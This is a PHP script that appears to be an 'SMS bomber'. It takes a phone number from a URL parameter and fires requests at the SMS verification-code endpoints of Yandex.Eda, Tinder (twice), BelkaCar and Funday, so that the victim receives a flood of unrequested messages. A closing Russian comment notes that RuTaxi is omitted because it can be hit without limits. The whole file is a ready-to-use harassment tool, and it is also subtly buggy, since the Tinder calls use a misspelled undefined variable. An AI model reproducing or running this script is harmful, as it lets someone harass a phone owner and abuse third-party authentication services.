<?

$ph = $_GET['phone'];
$ph = (string) $ph;

if($ph[0] !== "7") {
	die("Введите номер в формате +79770000000");
}

$format1 = $ph[0]  . $ph[1] . '(' . $ph[2] . $ph[3] . 
$ph[4] . ')' . $ph[5] . $ph[6] . $ph[7] . '-' . 
$ph[8] . $ph[9] . '-' . $ph[10] . $ph[11];
$format2 = str_replace("+7", "" , $ph);
$format3 = $ph[0]  . $ph[1] . ' (' . $ph[2] . $ph[3] . 
$ph[4] . ')' . $ph[5] . $ph[6] . $ph[7] . '-' . 
$ph[8] . $ph[9] . '-' . $ph[10] . $ph[11];
$format4 = str_replace("+", "" , $ph);

// Yandex.Eda
$data = array("phone_number" => $ph);
$curl = curl_init('https://eda.yandex/api/v1/user/request_authentication_code');
		
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'Content-Type: application/json'                       
));           
	
curl_exec($curl);
curl_close($curl);

// Tinder
$data = array("phone_number" => $foramt4);
$curl = curl_init('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru');
		
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'Content-Type: application/json'                       
));           
	
curl_exec($curl);
curl_close($curl);

// Tinder
$data = array("phone_number" => $foramt4);
$curl = curl_init('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru');
		
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'Content-Type: application/json'                       
));           
	
curl_exec($curl);
curl_close($curl);

// Belka.Car
$url = "https://belkacar.ru/get-confirmation-code";
$post_data = array (
    "phone" => $format4
);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);

curl_exec($ch);
curl_close($ch);

// FUNDAY
$url = "https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp";
$post_data = array (
    "phoneNumber" => $format3,
	"type" => ""
);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);

curl_exec($ch);
curl_close($ch);

// RuTaxi
// Тут не напишу, по сколько можно слать без ограничений.
?>